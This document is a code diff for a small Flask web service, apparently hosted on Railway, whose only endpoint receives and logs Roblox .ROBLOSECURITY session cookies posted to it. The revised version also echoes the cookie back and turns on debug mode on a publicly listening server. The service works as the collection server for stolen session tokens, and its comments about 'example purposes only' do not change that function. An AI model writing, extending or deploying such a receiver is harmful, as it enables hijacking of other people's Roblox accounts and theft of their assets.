@@ -4,20 +4,17 @@ app = Flask(__name__)
 
 @app.route('/receive_cookie', methods=['POST'])
 def receive_cookie():
-    # Get JSON data from the request
-    data = request.get_json(force=True)
-    cookie = data.get("cookie")
-    
+    data = request.get_json()
+    cookie = data.get('cookie', None)
     if cookie:
-        # Log the cookie (for example purposes only—avoid logging sensitive info in production)
-        print("Received .ROBLOSECURITY cookie:", cookie)
-        return jsonify({"status": "success", "message": "Cookie received"}), 200
+        # WARNING: Avoid exposing sensitive data in production.
+        app.logger.info("Received cookie: %s", cookie)
+        return jsonify({"message": "Cookie received successfully.", "cookie": cookie}), 200
     else:
-        return jsonify({"status": "error", "message": "No cookie provided"}), 400
+        return jsonify({"error": "No cookie provided."}), 400
 
 if __name__ == '__main__':
-    # Listen on all interfaces and use the environment's PORT if provided
-    # Railway will set the PORT environment variable automatically.
+    # For Railway, listen on all interfaces. Railway sets the PORT env var.
     import os
     port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
+    app.run(host="0.0.0.0", port=port, debug=True)
